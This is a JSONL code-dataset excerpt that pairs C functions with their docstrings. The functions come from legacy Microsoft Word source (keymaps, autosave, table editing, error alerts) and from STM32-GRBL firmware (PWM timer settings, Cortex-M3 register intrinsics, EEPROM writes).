{"docstring": "/* E N D  K E Y  M O D E */\n/* Finish mode by calling optional function specified in keymap and\nmake sure the keymap gets removed from the chain. */\n/* %%Function:EndKeyMode %%Owner:chic */\n", "func_signal": "EndKeyMode()", "code": "{\n\tint ikme;\n\tPFN pfn = NULL;\n\n\t/* The following can happen during initialization... */\n\tif (hkmpCur == hNil || !(*hkmpCur)->fModal)\n\t\treturn;\n\n\tif (FSearchKmp(hkmpCur, kcModal, &ikme))\n\t\t{\n\t\tpfn = (*hkmpCur)->rgkme[ikme].pfn;\n\t\t}\n\n\tRemoveKmp(hkmpCur);\n\n\tif (pfn)\n\t\t(*pfn)();\n}", "path": "Opus\\raremsg.c", "repo_name": "BlastarIndia/msword", "stars": 65, "license": "other", "language": "c", "size": 4539}
{"docstring": "/* %%Function:FlushPendingAlerts %%Owner:peterj */\n", "func_signal": "FlushPendingAlerts()", "code": "{\n\tReportPendingAlerts();\n\tvmerr.mat = matNil;\n\tvmerr.fHadMemAlert = fFalse;\n}", "path": "Opus\\wordtech\\error.c", "repo_name": "BlastarIndia/msword", "stars": 65, "license": "other", "language": "c", "size": 4539}
{"docstring": "/* ---------------------------------------------------------------------- */\n", "func_signal": "InitElkTable()", "code": "{\n\tmpelkichName = (unsigned *)PbAllocCb(celkQuantum * sizeof(unsigned));\n\telkMax = celkQuantum;\n\telkMac = elkMin;\n\tmpelkichName[0] = 0;\t/* elkNil */\n\n\trgchElkNames = (unsigned char *)PbAllocCb(cchQuantum * sizeof(char));\n\tichElkNameMax = cchQuantum;\n\tichElkNameMac = 0;\n}", "path": "OpusEtAl\\tools\\src\\mergeelx.c", "repo_name": "BlastarIndia/msword", "stars": 65, "license": "other", "language": "c", "size": 4539}
{"docstring": "/* D M I N U T E  U S E R  P O S T P O N E */\n/* Prompt the user for autosave postponement. */\n/*  %%Function: DMinuteUserPostpone  %%Owner: peterj  */\n", "func_signal": "int DMinuteUserPostpone()", "code": "{\n\tint dMinute;\n\tCABAUTOSAVE * pcabautosave;\n\tCMB cmb;\n\tchar dlt [sizeof (dltAutosave)];\n\n\tif ((cmb.hcab = HcabAlloc(cabiCABAUTOSAVE)) == hNil)\n\t\treturn dMinuteError;\n\n\tcmb.cmm = cmmNormal;\n\tcmb.pv = NULL;\n\tcmb.bcm = bcmNil;\n\tpcabautosave = (CABAUTOSAVE *) *cmb.hcab;\n\tpcabautosave->fPostpone = fFalse;\n\tpcabautosave->dMinutePostpone = uNinch;\n\n\tBltDlt(dltAutosave, dlt);\n\tswitch (TmcOurDoDlg(dlt, &cmb))\n\t\t{\n#ifdef DEBUG\n\tdefault:\n\t\tAssert(fFalse);\n\t\tdMinute = dMinuteError;\n\t\tbreak;\n#endif\n\n\tcase tmcError:\n\t\tdMinute = dMinuteError;\n\t\tbreak;\n\n\tcase tmcCancel:\n\t\tdMinute = dMinuteCancel;\n\t\tbreak;\n\n\tcase tmcOK:\n\t\tdMinute = 0;\n\t\tbreak;\n\t\t}\n\n\tif (dMinute == 0)\n\t\t{\n\t\tpcabautosave = (CABAUTOSAVE *) *cmb.hcab;\n\t\tif (pcabautosave->fPostpone)\n\t\t\t{\n\t\t\tdMinute = min(120,max(0, pcabautosave->dMinutePostpone));\n\t\t\t}\n\t\t}\n\n\tFreeCab(cmb.hcab);\n\n#ifdef DBGYXY\n\tCommSzNum(SzShared(\"dMinutePostpone: \"), dMinute);\n#endif\n\n\treturn dMinute;\n}", "path": "Opus\\cmd2.c", "repo_name": "BlastarIndia/msword", "stars": 65, "license": "other", "language": "c", "size": 4539}
{"docstring": "/* F  A N Y  D L  N O T  I N  X W */\n/* returns true iff any dl in ww hangs out to the left (right) of\nwwd.rcDisp */\n/* %%Function:FAnyDlNotInXw %%Owner:chic */\n", "func_signal": "FAnyDlNotInXw(ww, fLeft)", "code": "{\n\tstruct WWD *pwwd = PwwdWw(ww);\n\tstruct WWD *hpldr = HwwdWw(ww);\n\tint idrMac = pwwd->idrMac;\n\tstruct DR *pdr;\n\tstruct PLCEDL **hplcedl;\n\tint dlMac;\n\tint idr, dl;\n\tint xwLeft;\n\tint xwMin = pwwd->xwMin;\n\tstruct EDL edl;\n\n\tif (pwwd->fOutline) xwMin += DxpFromDxa(pwwd, dxaOtlMark);\n\tpdr = PdrWw(ww, 0);\n\tfor (idr = 0; idr < idrMac; idr++, pdr++)\n\t\t{\n\t\tif (pdr->hplcedl == hNil)\n\t\t\tcontinue;\n/* check for dr being entirely within range */\n\t\tif (fLeft)\n\t\t\t{\n\t\t\tif (XwFromXp(hpldr, idr, -pdr->dxpOutLeft)\n\t\t\t\t\t>= xwMin) continue;\n\t\t\t}\n\t\telse\n\t\t\t{\n\t\t\tif (XwFromXp(hpldr, idr, pdr->dxl + pdr->dxpOutRight)\n\t\t\t\t\t<= pwwd->xwMac) continue;\n\t\t\t}\n\t\thplcedl = pdr->hplcedl;\n\t\tdlMac = IMacPlc(hplcedl);\n\t\tfor (dl = 0; dl < dlMac; dl++)\n\t\t\t{\n\t\t\tGetPlc(hplcedl, dl, &edl);\n\t\t\tif (edl.dlk)\n\t\t\t\tbreak;\n\t\t\txwLeft = XwFromXp(hpldr, idr, edl.xpLeft);\n\t\t\tif (fLeft)\n\t\t\t\t{\n\t\t\t\tif (xwLeft >= xwMin) continue;\n\t\t\t\t}\n\t\t\telse\n\t\t\t\t{\n\t\t\t\tif (xwLeft + edl.dxp\n\t\t\t\t\t\t<= pwwd->xwMac) continue;\n\t\t\t\t}\n\t\t\treturn fTrue;\n\t\t\t}\n\t\t}\n\treturn fFalse;\n}", "path": "Opus\\wordtech\\select.c", "repo_name": "BlastarIndia/msword", "stars": 65, "license": "other", "language": "c", "size": 4539}
{"docstring": "/* C M D  A U T O S A V E */\n/* Check a user response and take an appropriate action. */\n/*  %%Function: CmdAutosave  %%Owner: peterj  */\n", "func_signal": "CMD CmdAutosave()", "code": "{\n\tint  dMinute;\n\n\tBeep(); /* warn user */\n\t/* bring up dialog */\n\tdMinute = DMinuteUserPostpone();\n\n\tif (dMinute == dMinuteError)\n\t\t{\n\t\treturn cmdError;\n\t\t}\n\n\tResetASBase();\n\n\tif (dMinute != dMinuteCancel)\n\t\t{\n\t\tif (dMinute == 0)\n\t\t\t/* do save now */\n\t\t\t{\n\t\t\tFConfirmSaveAllDocs(acAutoSave);\n\t\t\t}\n\t\telse\n\t\t\t/* postpone by dMinute minutes */\n\t\t\t{\n\t\t\tasd.dmscLastPostpone = dMinute * dmscMinute;\n\t\t\tasd.mscPostpone = GetTickCount() + asd.dmscLastPostpone;\n\t\t\t}\n\t\t}\n\n\treturn cmdOK;\n}", "path": "Opus\\cmd2.c", "repo_name": "BlastarIndia/msword", "stars": 65, "license": "other", "language": "c", "size": 4539}
{"docstring": "/*  %%Function: FRepeatRulerRibbon  %%Owner: bobz  */\n", "func_signal": "FRepeatRulerRibbon()", "code": "{\n\tint\t\tcb;\n\tstruct CA\tca, caInval;\n\tstruct SEBL\tsebl;\n\tCHAR\t\tgrpprl[cbMaxGrpprl];\n\n\tif (!rrf.fSelMoved || !rrf.fDirty)\n\t\t{\n\t\treturn fFalse;\n\t\t}\n\n\tcb = 0;\n\tgrpprl[0] = sprmNoop;\n\tif (rrf.fRibbon)\n\t\t{\n\t\t/* Repeat ribbon stuff. */\n\t\tif (rrf.fBold)\n\t\t\t{\n\t\t\tcb = CbMergeInOnePrl(grpprl, cb, sprmCFBold, 1);\n\t\t\t}\n\t\tif (rrf.fItalic)\n\t\t\t{\n\t\t\tcb = CbMergeInOnePrl(grpprl, cb, sprmCFItalic, 1);\n\t\t\t}\n\t\tif (rrf.fSCaps)\n\t\t\t{\n\t\t\tcb = CbMergeInOnePrl(grpprl, cb, sprmCFSmallCaps, 1);\n\t\t\t}\n\t\tif (rrf.kul != kulNone)\n\t\t\t{\n\t\t\tcb = CbMergeInOnePrl(grpprl, cb, sprmCKul, rrf.kul);\n\t\t\t}\n\t\tif (rrf.iSuperSub != iSSNormal)\n\t\t\t{\n\t\t\tcb = CbMergeInOnePrl(grpprl, cb, sprmCHpsPos,\n\t\t\t\t\t(rrf.iSuperSub == iSSSuper) ? 6 : -6);\n\t\t\t}\n\t\tif (rrf.ftc != ftcNil)\n\t\t\t{\n\t\t\tcb = CbMergeInOnePrl(grpprl, cb, sprmCFtc, rrf.ftc);\n\t\t\t}\n\t\tif (rrf.hps != 0)\n\t\t\t{\n\t\t\tcb = CbMergeInOnePrl(grpprl, cb, sprmCHps, rrf.hps);\n\t\t\t}\n\n\t\tApplyGrpprlSelCur(grpprl, cb, fTrue);\n\n\t\tif (vmerr.fMemFail)\n\t\t\treturn fFalse;\n\t\t}\n\telse  /* ruler */\t\t\n\t\t{\n\t\tca = selCur.ca;\n\t\tExpandCaSprm(&ca, &caInval, grpprl);\n\t\tif (!FSetUndoB1(bcmFormatting, uccFormat, &ca))\n\t\t\t{\n\t\t\treturn fFalse;\n\t\t\t}\n\t\tif (rrf.cbGrpprl != 0)\n\t\t\t{\n\t\t\tAssert(rrf.hgrpprl != hNil);\n\t\t\tbltbyte(*(rrf.hgrpprl), grpprl, cb = rrf.cbGrpprl);\n\t\t\tApplyGrpprlSelCur(grpprl, cb, fFalse);\n\t\t\t}\n\t\tSetUndoAfter(&ca);\n\t\t}\n\n\tSetAgain(bcmRRFormat);\n\n\n\tif (vfRecording && cb != 0)\n\t\tRecordGrpprl(grpprl, cb);\n\n\treturn fTrue;\n}", "path": "Opus\\cmd2.c", "repo_name": "BlastarIndia/msword", "stars": 65, "license": "other", "language": "c", "size": 4539}
{"docstring": "/* C M D  I N S  T A B L E  R O W S */\n/* Insert rows into a table.  Used by Edit Table. */\n/* Requires the current selection to be in a table */\n/* %%Function:CmdInsTableRows %%Owner:davidmck %%Reviewed:6/27/89 */\n", "func_signal": "CmdInsTableRows()", "code": "{\n\tint cRows, cColumns, cRowsIns;\n\tstruct CA caT;\n\tstruct SELS selsIns;\n\n\tAssert(selCur.fTable || selCur.fWithinCell);\n\n\tblt(&selCur, &selsIns, cwSELS);\n\tExtendPselsRows(&selsIns);     /* Extend the selection to cover rows */\n\n\tCpFirstTap(selsIns.doc, selsIns.cpFirst);\n\tcColumns = vtapFetch.itcMac;\n\n\t/* Number of rows to insert is based on number in selection */\n\tcRows = CountRowsPca(&selsIns.ca);\n\n\tif (!FSetUndoB1(ucmInsRows, uccPaste, PcaPoint(&caT, selsIns.doc, selsIns.cpFirst)))\n\t\treturn(cmdCancelled);\n\n\t/* Call subroutine to actually insert the rows.  Will return how\n\t\tmany were successfully insertted */\n\tCpFirstTap(selsIns.doc, selsIns.cpFirst);\n\tcRowsIns = CInsertNewRows(selsIns.doc, selsIns.cpFirst, cRows, cColumns, &vtapFetch, fFalse);\n\tif (cRowsIns)\n\t\tSelectRow(&selCur, selsIns.cpFirst, selsIns.cpFirst + cRowsIns * (cColumns + 1) * ccpEop);\n\n\tSetUndoAfter(&selCur.ca);\n\tMac( SetAgainUcm(ucmInsRows, ascEdit) );\n\tDirtyOutline(selCur.doc);\n\n\treturn (cRowsIns != cRows) ? cmdError : cmdOK;\n\n}", "path": "Opus\\wordtech\\tablecmd.c", "repo_name": "BlastarIndia/msword", "stars": 65, "license": "other", "language": "c", "size": 4539}
{"docstring": "/* %%Function:ResizeMwds %%Owner:chic */\n", "func_signal": "ResizeMwds()", "code": "{\n\tint ihwnd;\n\tstruct RC rc, rcT;\n\tHWND hwnd;\n\tHWND rghwnd[mwMax];\n\tint ypBottom;\n\n\tif (hmwdCur == hNil) /* fairly bogus test to see if any windows are open */\n\t\treturn; /* nothing to do! */\n\n\t/* get top to bottom list of windows */\n\n\trghwnd[ihwnd = 0] = (*hmwdCur)->hwnd;\n\n\twhile ((hwnd = rghwnd[ihwnd]) != hNil)\n\t\t{\n\t\trghwnd[++ihwnd] = GetNextWindow(hwnd, GW_HWNDNEXT);\n\t\tAssert (ihwnd < mwMax);\n\t\t}\n\tGetClientRect(vhwndDeskTop, (LPRECT) &rcT);\n\n\t/* move the windows in reverse order so that all windows are\n\tstacked in the right order and the current one is on top */\n\n\twhile (ihwnd > 0)\n\t\t{\n\t\tGetWindowRect( rghwnd[--ihwnd], (LPRECT) &rc );\n\t\tScreenToClient( vhwndDeskTop, (LPPOINT) &rc.ptTopLeft );\n\t\tScreenToClient( vhwndDeskTop, (LPPOINT) &rc.ptBottomRight );\n\t\typBottom = rc.ypBottom;\n\t\tif (ypBottom > rcT.ypBottom + vsci.dypBorder)\n\t\t\t{\n\t\t\trc.ypBottom = rcT.ypBottom;\n\t\t\tMoveWindowRc( rghwnd[ihwnd], &rc, fTrue );\n\t\t\t}\n\t\t}\n}", "path": "Opus\\raremsg.c", "repo_name": "BlastarIndia/msword", "stars": 65, "license": "other", "language": "c", "size": 4539}
{"docstring": "/* U N H O O K  T A B L E  K E Y M A P */\n/* %%Function:UnhookTableKeymap %%Owner:rosiep */\n", "func_signal": "UnhookTableKeymap()", "code": "{\n\tAssertDo(FDislinkHkmp(hkmpTable));\n\tvfTableKeymap = fFalse;\n}", "path": "Opus\\wordtech\\select.c", "repo_name": "BlastarIndia/msword", "stars": 65, "license": "other", "language": "c", "size": 4539}
{"docstring": "/* assure there are no duplicates */\n/* %%Function:CkEids %%Owner:peterj */\n", "func_signal": "CkEids()", "code": "{\n\tint iemd1, iemd2, eid1, eid2;\n\tfor (iemd1 = 0; (eid1 = rgemd[iemd1].eid) != eidNull; iemd1++)\n\t\tfor (iemd2 = iemd1+1; (eid2 = rgemd[iemd2].eid) != eidNull; iemd2++)\n\t\t\tif (eid2 == eid1)\n\t\t\t\t{\n\t\t\t\tAssert(fFalse);\n#ifdef WIN\n\t\t\t\tCommSzNum(SzShared(\"iemd1 = \"), iemd1);\n\t\t\t\tCommSzNum(SzShared(\"iemd2 = \"), iemd2);\n\t\t\t\tCommSzNum(SzShared(\"eid = \"), eid1);\n#endif /* WIN */\n\t\t\t\t}\n}", "path": "Opus\\wordtech\\error.c", "repo_name": "BlastarIndia/msword", "stars": 65, "license": "other", "language": "c", "size": 4539}
{"docstring": "/*  %%Function: BlockModeEnd  %%Owner: chic  */\n", "func_signal": "BlockModeEnd()", "code": "{\n\tif (vfBlockSel)\n\t\t{\n\t\tAssert(hmwdCur != hNil);\n\t\tToggleBlockSel();\n\t\t}\n}", "path": "Opus\\cmd2.c", "repo_name": "BlastarIndia/msword", "stars": 65, "license": "other", "language": "c", "size": 4539}
{"docstring": "/* C M D  D E L  T A B L E  R O W S */\n/* Delete rows in a table */\n/* %%Function:CmdDelTableRows %%Owner:davidmck %%Reviewed:6/27/89 */\n", "func_signal": "CmdDelTableRows()", "code": "{\n\tstruct SELS selsDel;\n\n\tblt(&selCur, &selsDel, cwSELS);\n\n\tExtendPselsRows(&selsDel);     /* Extend the selection to cover rows */\n\n\tTurnOffSel(&selCur);\n\n\tif (!FSetUndoB1(ucmDeleteRows, uccPaste, &selsDel.ca))\n\t\treturn(cmdCancelled);\n\n\tFDeleteRM(&selsDel.ca);\n\n\t/* Do this to reset the flags in selCur */\n\tSelectIns(&selCur, selCur.cpFirst);\n\n\tif (vmerr.fMemFail)\n\t\treturn cmdNoMemory;\n\n#ifdef MAC\n\tAssert(DcpCa(&selsDel.ca) == 0);\n#endif\n\tSetUndoAfter(&selsDel.ca);\n\tMac( SetAgainUcm(ucmDeleteRows, ascEdit) );\n\tDirtyOutline(selCur.doc);\n\n\treturn cmdOK;\n}", "path": "Opus\\wordtech\\tablecmd.c", "repo_name": "BlastarIndia/msword", "stars": 65, "license": "other", "language": "c", "size": 4539}
{"docstring": "/*----------------------------------------------------------------------------\n|\tWaitActivation\n|\n|\tThis routine waits until we are active, while it waits it\n|\tflashes the title bar to show how impatient it is.\n|\n|\tArguments:\n|\t\tnone.\n----------------------------------------------------------------------------*/\n/* %%Function:WaitActivation %%Owner:chic */\n", "func_signal": "BOOL WaitActivation()", "code": "{\n\tMSG msg;\n\n\tAssert(vfDeactByOtherApp);\n\n\tif (vidf.fDead || InSendMessage ())\n\t\treturn;\n\n\tBeep();\n\n\tSetTimer(vhwndApp, flashID = tidFlash, 500, (LPSTR)NULL);\n\n\twhile (vfDeactByOtherApp)\n\t\t{\n\t\tGetMessage((MSG far *)&msg, NULL, 0, 0);\n\t\t/* Activated by clicking on our non-client area; don't allow\n\t\t\tmenus to drop down */ /* Don't accept command messages unless\n\t\t\twer're active either... */\n\t\tif ((msg.message != WM_COMMAND && msg.message != WM_NCLBUTTONDOWN) || \n\t\t\t\tmsg.hwnd != vhwndApp)\n\t\t\t{\n#ifdef SHOWYIELDWAITMSG\n\t\t\tShowMsg (\"wa\", msg.hwnd, msg.message, msg.wParam,\n\t\t\t\t\tmsg.lParam);\n#endif /* SHOWYIELDWAITMSG */\n\t\t\tTranslateMessage((MSG far *)&msg);\n\t\t\tDispatchMessage((MSG far *)&msg);\n\t\t\t}\n\t\t}\n}", "path": "Opus\\raremsg.c", "repo_name": "BlastarIndia/msword", "stars": 65, "license": "other", "language": "c", "size": 4539}
{"docstring": "/* E N S U R E  T A B L E  S T C */\n/* needed because plcpad has only one entry per table, but there many\nbe many paragraphs */\n/* %%Function:EnsureTableStc %%Owner:davidlu */\n", "func_signal": "EnsureTableStc(doc, hplcpad, ipad)", "code": "{\n\tint cstcStd;\n\tCP cp = CpPlc(hplcpad, ipad);\n\tCP cpLim = CpPlc(hplcpad, ipad + 1);\n\tdo\n\t\t{\n\t\tCachePara(doc, cp);\n\t\tcp = caPara.cpLim;\n\t\tFEnsureStcDefined(doc, vpapFetch.stc, &cstcStd);\n\t\t}\n\twhile (cp < cpLim);\n}", "path": "Opus\\wordtech\\outline.c", "repo_name": "BlastarIndia/msword", "stars": 65, "license": "other", "language": "c", "size": 4539}
{"docstring": "/* %%Function:ReportPendingAlerts %%Owner:peterj */\n", "func_signal": "ReportPendingAlerts()", "code": "{\n\tif (!vmerr.fHadMemAlert)\n\t\t{\n\t\tswitch (vmerr.mat)\n\t\t\t{\n\t\tcase matMem:\n\t\t\tErrorEid(eidLowMemCloseWindows,\"ReportPendingAlerts\");\n\t\t\tbreak;\n\t\tcase matReplace:\n\t\t\tErrorEid(eidTooManyEdits,\"ReportPendingAlerts\");\n\t\t\tSetUndoNil();\n\t\t\tbreak;\n\t\tcase matLow:\n\t\t\tErrorNoMemory(eidNoMemOperation);\n\t\t\tbreak;\n\t\tcase matDisp:\n\t\t\t/* we only report this once per session because otherwise\n\t\t\t\twe'd be reporting it over and over */\n\t\t\tif (!vmerr.fHadDispAlert)\n\t\t\t\t{\n\t\t\t\tErrorNoMemory(eidNoMemDisplay);\n\t\t\t\tvmerr.fHadDispAlert = fTrue;\n\t\t\t\t}\n\t\t\tbreak;\n\t\tcase matMenu:\n\t\t\tErrorEid(eidLowMemMenu, \"menu\");\n\t\t\tbreak;\n\t\tcase matFont:\n\t\t\t/* we only report this once per session because otherwise\n\t\t\t\twe'd be reporting it over and over */\n\t\t\tif (!vmerr.fHadDispAlert)\n\t\t\t\t{\n\t\t\t\tErrorEid(eidCantRealizeFont, \"ReportPendingAlerts\");\n\t\t\t\tvmerr.fHadDispAlert = fTrue;\n\t\t\t\t}\n\t\t\tbreak;\n\t\tcase matCBT:\n\t\t\t/* clear this now so ErrorNoMemory lets message come up */\n\t\t\tvmerr.mat = matNil;\n\t\t\tErrorNoMemory(eidNoMemCBT);\n\t\t\tbreak;\n\t\t\t}\n\t\t}\n\n\tvmerr.fHadMemAlert = fTrue;\n}", "path": "Opus\\wordtech\\error.c", "repo_name": "BlastarIndia/msword", "stars": 65, "license": "other", "language": "c", "size": 4539}
{"docstring": "/* %%Function:LoadPreviewFont %%Owner:chic */\n", "func_signal": "LoadPreviewFont()", "code": "{\n\tchar *stPrev = StFrame(\"PREV.FON\");\n\tchar szBuffer[cchMaxSz];\n\tchar stFull[ichMaxFile];\n\n\tvpvs.fLoadPrvwFon = fFalse;\n\n\tif (FFindFileSpec(stPrev, stFull, grpfpiUtil, nfoNormal))\n\t\tStToSzInPlace(stFull);\n\telse\n\t\t{\n\t\tStToSz(stPrev, stFull);\n\t\t/* Avoid \"Cannot find PREV.FON\" message box if they're not around */\n\t\tif (OpenFile((LPSTR)stFull, (LPOFSTRUCT)szBuffer, OF_EXIST) == -1)\n\t\t\treturn;\n\t\t}\n\tAddFontResource((LPSTR)stFull);\n}", "path": "Opus\\raremsg.c", "repo_name": "BlastarIndia/msword", "stars": 65, "license": "other", "language": "c", "size": 4539}
{"docstring": "/*  %%Function: ToggleBlockSel  %%Owner: chic  */\n", "func_signal": "ToggleBlockSel()", "code": "{\n\tvfBlockSel = !vfBlockSel;\n\tif (vhwndStatLine != NULL)\n\t\tUpdateStatusLine(usoToggles);\n}", "path": "Opus\\cmd2.c", "repo_name": "BlastarIndia/msword", "stars": 65, "license": "other", "language": "c", "size": 4539}
{"docstring": "/* H O O K  T A B L E  K E Y M A P */\n/* %%Function:FHookTableKeymap %%Owner:rosiep */\n", "func_signal": "BOOL FHookTableKeymap()", "code": "{\n\tAssert(hkmpTable);\n\n\t/* hook it in before the user's keymap */\n\t(*hkmpTable)->hkmpNext = (*vhkmpUser)->hkmpNext;\n\t(*vhkmpUser)->hkmpNext = hkmpTable;\n\n\tvfTableKeymap = fTrue;\n}", "path": "Opus\\wordtech\\select.c", "repo_name": "BlastarIndia/msword", "stars": 65, "license": "other", "language": "c", "size": 4539}
{"docstring": "/* C L E A R  U S R  D L G  V A R S */\n/* Look at ALL variables for user-defined dialog records and free the\n   associated cabs */\n", "func_signal": "ClearUsrDlgVars()", "code": "{\n\tstruct FH huge * hpfhCur;\n\tstruct VAR * pvarLim, huge *hpvar;\n\t\n\tAssert(sbFrame != 0);\n\n\tpvarLim = *HpFrame(ibMac);\n\tfor (hpfhCur = HpOfSbIb(sbFrame, Global(pfhCurFrame)); \n\t\tIbOfHp(hpfhCur) != pfhNil; \n\t\thpfhCur = HpOfSbIb(sbFrame, hpfhCur->pfhPrev))\n\t\t{\n\t\tfor (hpvar = &hpfhCur->rgvar; IbOfHp(hpvar) < pvarLim; \n\t\t\t\thpvar = (char huge *) hpvar + CbVarFromElv(hpvar->elv))\n\t\t\t{\n\t\t\tif (FRecordElv(hpvar->elv) && hpvar->elx == ibcmUserDialog &&\n\t\t\t\t\thpvar->rek.hcab != 0)\n\t\t\t\t{\n\t\t\t\tFreeCab(hpvar->rek.hcab);\n\t\t\t\thpvar->rek.hcab = 0;\n\t\t\t\t}\n\t\t\t}\n\t\t\n\t\tpvarLim = IbOfHp(hpfhCur);\n\t\t}\n}", "path": "Opus\\interp\\sym.c", "repo_name": "BlastarIndia/msword", "stars": 65, "license": "other", "language": "c", "size": 4539}
{"docstring": "/*******************************\u01b8\u0368*****************************************************/\n", "func_signal": "void Change_TIM4_OC1_Pulse(u16 Pulse)", "code": "{\n     TIM4_OCInitStructure.TIM_Pulse = Pulse;\n\t TIM_OC1Init(TIM4,&TIM4_OCInitStructure);\n}", "path": "user\\pwm\\pwm.c", "repo_name": "Meekdai/STM32-GRBL", "stars": 88, "license": "gpl-2.0", "language": "c", "size": 2853}
{"docstring": "/**\n * @brief  Return the Priority Mask value\n *\n * @param  none\n * @return uint32_t PriMask\n *\n * Return the state of the priority mask bit from the priority mask\n * register\n */\n", "func_signal": "uint32_t __get_PRIMASK(void)", "code": "{\n  uint32_t result=0;\n\n  __ASM volatile (\"MRS %0, primask\" : \"=r\" (result) );\n  return(result);\n}", "path": "sys\\core_cm3.c", "repo_name": "Meekdai/STM32-GRBL", "stars": 88, "license": "gpl-2.0", "language": "c", "size": 2853}
{"docstring": "// Extensions added as part of Grbl \n", "func_signal": "void memcpy_to_eeprom_with_checksum(unsigned int destination, char *source, unsigned int size)", "code": "{\n  unsigned char checksum = 0;\n  for(; size > 0; size--) { \n    checksum = (checksum << 1) || (checksum >> 7);\n    checksum += *source;\n    eeprom_put_char(destination++, *(source++)); \n  }\n  eeprom_put_char(destination, checksum);\n}", "path": "user\\cnc\\eepromavr.c", "repo_name": "Meekdai/STM32-GRBL", "stars": 88, "license": "gpl-2.0", "language": "c", "size": 2853}
{"docstring": "/**\n * @brief  Return the Base Priority value\n *\n * @param  none\n * @return uint32_t BasePriority\n *\n * Return the content of the base priority register\n */\n", "func_signal": "__ASM uint32_t  __get_BASEPRI(void)", "code": "{\n  mrs r0, basepri\n  bx lr\n}", "path": "sys\\core_cm3.c", "repo_name": "Meekdai/STM32-GRBL", "stars": 88, "license": "gpl-2.0", "language": "c", "size": 2853}
{"docstring": "/*********************************\u0368\u053f*****************************************************/\n", "func_signal": "void Change_TIM4_OC1_Polarity(u8 i)", "code": "{\n     if(i==1)TIM4_OCInitStructure.TIM_OCPolarity = TIM_OCPolarity_High;\n\t else \t TIM4_OCInitStructure.TIM_OCPolarity = TIM_OCPolarity_Low;\n\t TIM_OC1Init(TIM4,&TIM4_OCInitStructure);\n}", "path": "user\\pwm\\pwm.c", "repo_name": "Meekdai/STM32-GRBL", "stars": 88, "license": "gpl-2.0", "language": "c", "size": 2853}
{"docstring": "/*******************************\u01b8\u0368*****************************************************/\n", "func_signal": "void Change_TIM2_OC1_Pulse(u16 Pulse)", "code": "{\n     TIM2_OCInitStructure.TIM_Pulse = Pulse;\n\t TIM_OC1Init(TIM2,&TIM2_OCInitStructure);\n}", "path": "user\\pwm\\pwm.c", "repo_name": "Meekdai/STM32-GRBL", "stars": 88, "license": "gpl-2.0", "language": "c", "size": 2853}
{"docstring": "/**\n * @brief  STR Exclusive\n *\n * @param  uint8_t *address\n * @param  uint8_t value to store\n * @return uint32_t successful / failed\n *\n * Exclusive STR command\n */\n", "func_signal": "uint32_t __STREXB(uint8_t value, uint8_t *addr)", "code": "{\n   uint32_t result=0;\n  \n   __ASM volatile (\"strexb %0, %2, [%1]\" : \"=r\" (result) : \"r\" (addr), \"r\" (value) );\n   return(result);\n}", "path": "sys\\core_cm3.c", "repo_name": "Meekdai/STM32-GRBL", "stars": 88, "license": "gpl-2.0", "language": "c", "size": 2853}
{"docstring": "/**\n * @brief  Return the Base Priority value\n *\n * @param  none\n * @return uint32_t BasePriority\n *\n * Return the content of the base priority register\n */\n", "func_signal": "uint32_t __get_BASEPRI(void)", "code": "{\n  uint32_t result=0;\n  \n  __ASM volatile (\"MRS %0, basepri_max\" : \"=r\" (result) );\n  return(result);\n}", "path": "sys\\core_cm3.c", "repo_name": "Meekdai/STM32-GRBL", "stars": 88, "license": "gpl-2.0", "language": "c", "size": 2853}
{"docstring": "/**\n * @brief  Set the Process Stack Pointer\n *\n * @param  uint32_t Process Stack Pointer\n * @return none\n *\n * Assign the value ProcessStackPointer to the MSP \n * (process stack pointer) Cortex processor register\n */\n", "func_signal": "__ASM void __set_PSP(uint32_t topOfProcStack)", "code": "{\n  msr psp, r0\n  bx lr\n}", "path": "sys\\core_cm3.c", "repo_name": "Meekdai/STM32-GRBL", "stars": 88, "license": "gpl-2.0", "language": "c", "size": 2853}
{"docstring": "/**\n * @brief  Return the Main Stack Pointer\n *\n * @param  none\n * @return uint32_t Main Stack Pointer\n *\n * Return the current value of the MSP (main stack pointer)\n * Cortex processor register\n */\n", "func_signal": "uint32_t __get_MSP(void)", "code": "{\n  uint32_t result=0;\n\n  __ASM volatile (\"MRS %0, msp\" : \"=r\" (result) );\n  return(result);\n}", "path": "sys\\core_cm3.c", "repo_name": "Meekdai/STM32-GRBL", "stars": 88, "license": "gpl-2.0", "language": "c", "size": 2853}
{"docstring": "/**\n * @brief  Reverse byte order in signed short value with sign extension to integer\n *\n * @param  int32_t value to reverse\n * @return int32_t reversed value\n *\n * Reverse byte order in signed short value with sign extension to integer\n */\n", "func_signal": "int32_t __REVSH(int16_t value)", "code": "{\n  uint32_t result=0;\n  \n  __ASM volatile (\"revsh %0, %1\" : \"=r\" (result) : \"r\" (value) );\n  return(result);\n}", "path": "sys\\core_cm3.c", "repo_name": "Meekdai/STM32-GRBL", "stars": 88, "license": "gpl-2.0", "language": "c", "size": 2853}
{"docstring": "/**\n * @brief  STR Exclusive\n *\n * @param  uint32_t *address\n * @param  uint32_t value to store\n * @return uint32_t successful / failed\n *\n * Exclusive STR command\n */\n", "func_signal": "uint32_t __STREXW(uint32_t value, uint32_t *addr)", "code": "{\n   uint32_t result=0;\n  \n   __ASM volatile (\"strex %0, %2, [%1]\" : \"=r\" (result) : \"r\" (addr), \"r\" (value) );\n   return(result);\n}", "path": "sys\\core_cm3.c", "repo_name": "Meekdai/STM32-GRBL", "stars": 88, "license": "gpl-2.0", "language": "c", "size": 2853}
{"docstring": "/**\n * @brief  Reverse bit order of value\n *\n * @param  uint32_t value to reverse\n * @return uint32_t reversed value\n *\n * Reverse bit order of value\n */\n", "func_signal": "uint32_t __RBIT(uint32_t value)", "code": "{\n  __ASM(\"rbit r0, r0\");\n  __ASM(\"bx lr\");\n}", "path": "sys\\core_cm3.c", "repo_name": "Meekdai/STM32-GRBL", "stars": 88, "license": "gpl-2.0", "language": "c", "size": 2853}
{"docstring": "/**\n * @brief  Return the Fault Mask value\n *\n * @param  none\n * @return uint32_t FaultMask\n *\n * Return the content of the fault mask register\n */\n", "func_signal": "uint32_t __get_FAULTMASK(void)", "code": "{\n  uint32_t result=0;\n  \n  __ASM volatile (\"MRS %0, faultmask\" : \"=r\" (result) );\n  return(result);\n}", "path": "sys\\core_cm3.c", "repo_name": "Meekdai/STM32-GRBL", "stars": 88, "license": "gpl-2.0", "language": "c", "size": 2853}
